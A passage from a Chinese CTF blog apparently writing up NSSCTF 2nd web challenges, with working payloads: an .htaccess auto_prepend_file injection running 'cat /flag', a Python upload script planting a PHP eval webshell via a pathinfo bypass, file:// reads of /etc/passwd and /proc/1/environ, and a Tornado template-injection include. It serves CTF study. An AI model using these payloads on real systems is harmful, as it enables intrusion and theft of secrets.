    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里以参数content和filename传入文件内容和文件名，内容中不能带有<code>on，html，type，flag，upload，file</code>。并且文件名只能是小写字母。<br><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>这里的文件内容会拼接上helloworld。<br>写入内容如下：</p>
<blockquote>
<p><code>php_value auto_prepend_fil\ e .htaccess #&lt;?php system(&#39;cat /fla?);?&gt;\ </code></p>
</blockquote>
<p>php_value auto_prepend_file用来在页面底部加载文件，由于file被过滤了，这里使用<code>fil\%0Ae</code>，<code>#</code>是为了迎合**.htaccess**的书写形式。尾部的<code>\</code>是为了转义后面的换行符。最后格式为</p>
<blockquote>
<p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla'.'g');?>\hellowprld<br>如果是<br>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla?');?><br>helloworld<br>这样会报错500.</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/cb25147337d94147ba512a0d14fbc9dd.png" alt="5"></p>
<p>优秀文章：<br><a href="https://www.cxyzjd.com/article/Zero_Adam/116808755">羊城杯2020 easyphp — 伪协议的使用时机，—python上传.htaccess的利用 – preg_match绕过_Zero_Adam的博客-程序员宅基地</a></p>
<p><a href="https://xz.aliyun.com/t/8267#toc-0">Apache的.htaccess利用技巧</a></p>
]]></content>
      <categories>
        <category>nssctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>nssctf2ndweb</title>
    <url>/2023/09/02/nssctf2ndweb/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="NSSCTF-2nd-php签到"><a href="#NSSCTF-2nd-php签到" class="headerlink" title="[NSSCTF 2nd]php签到"></a>[NSSCTF 2nd]php签到</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_list</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please re-upload"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里涉及到一个函数<strong>pathinfo</strong>，<a href="https://blog.zsxsoft.com/post/36">绕过pathinfo</a>，<code>pathinfo($filename, PATHINFO_EXTENSION)</code>获取文件后缀名时获取的<code>.</code>后面的内容，当出现多个点时，结果为最后一个<code>.</code>后面的内容。我们只要传入index.php&#x2F;.就可以绕过pathinfo的检测了。当传入此参数是<code>1.php/.</code>时，<code>pathinfo</code>获取的文件的后缀名为NULL，所以可以在文件名后面添加<code>/.</code>来实现绕过，记得url编码文件名。<br>这里我使用burp上传文件失败，于是采用python脚本上传</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">upload_content_with_filename</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> content<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
    <span class="token keyword">return</span> response

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    upload_url <span class="token operator">=</span> <span class="token string">'http://node5.anna.nssctf.cn:28154/'</span>  <span class="token comment"># 替换为实际的上传URL</span>
    content_to_upload <span class="token operator">=</span> <span class="token string">"&lt;?php @eval($_POST[1]); phpinfo(); ?>"</span>  <span class="token comment"># 替换为要上传的内容</span>
    filename_to_upload <span class="token operator">=</span> <span class="token string">"123.php%2F."</span>  <span class="token comment"># 替换为要设置的文件名</span>
    response <span class="token operator">=</span> upload_content_with_filename<span class="token punctuation">(</span>upload_url<span class="token punctuation">,</span> content_to_upload<span class="token punctuation">,</span> filename_to_upload<span class="token punctuation">)</span>

    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"内容上传成功！"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"内容上传失败。"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"响应代码:"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"响应内容:"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后连接蚁剑，flag在环境变量里<br><img src="https://img-blog.csdnimg.cn/e45ecf02df5f46b7bd9e79579b429f1b.png" alt="1"></p>
<h3 id="NSSCTF-2nd-MyBox"><a href="#NSSCTF-2nd-MyBox" class="headerlink" title="[NSSCTF 2nd]MyBox"></a>[NSSCTF 2nd]MyBox</h3><p><a href="http://node5.anna.nssctf.cn:28756/?url=dosth">http://node5.anna.nssctf.cn:28756/?url=dosth</a><br>这个形式我们可能想到LFI漏洞，经过测试发现file:&#x2F;&#x2F;可以<br><a href="http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96">http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd可以读取</a><br><img src="https://img-blog.csdnimg.cn/1fb22c00512948079f0e1969a2b48236.png" alt="2"><br>读取到源码<code>app/app.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> struct
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/?url=dosth'</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'mybox://127.0.0.1:'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        port<span class="token punctuation">,</span> content <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/_'</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data<span class="token punctuation">:</span>
                res <span class="token operator">+=</span> data
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">return</span> <span class="token string">''</span>

app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不看上面代码的情况下这题还有一个非预期解就是直接读取环境变量<br><code>view-source:http://node5.anna.nssctf.cn:28756/?url=file:///proc/1/environ</code><br><img src="https://img-blog.csdnimg.cn/67f10ba64ae2427f86015bf9692890c1.png" alt="3"></p>
<h3 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop
<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
<span class="token keyword">import</span> os

BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bl <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> bl<span class="token punctuation">:</span>
        <span class="token keyword">if</span> c <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">for</span> chunk <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">&lt;</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">class</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">"ssti"</span><span class="token punctuation">)</span><span class="token comment">#POST传入ssti</span>
        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""&lt;html>
                        &lt;head>&lt;/head>
                        &lt;body style="font-size: 30px;"></span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/body>&lt;/html>
                        """</span></span><span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token string">'no no no'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token punctuation">(</span><span class="token string">r"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> compiled_template_cache<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">)</span>
    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>current<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看出是<strong>tornado</strong>模板注入<br>非预期读取环境变量<code>&#123;% include /proc/1/environ %&#125;</code>.<br><img src="https://img-blog.csdnimg.cn/a093653f8c384dafaf5510233312477b.png" alt="4"></p>
<h3 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h3><blockquote>
<p>考点：jwt空算法攻击+ejs原型链污染</p>
</blockquote>
<p>这题复现搞了半天。。。</p>
<p>打开网站，查看源代码<code>/source</code>。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>
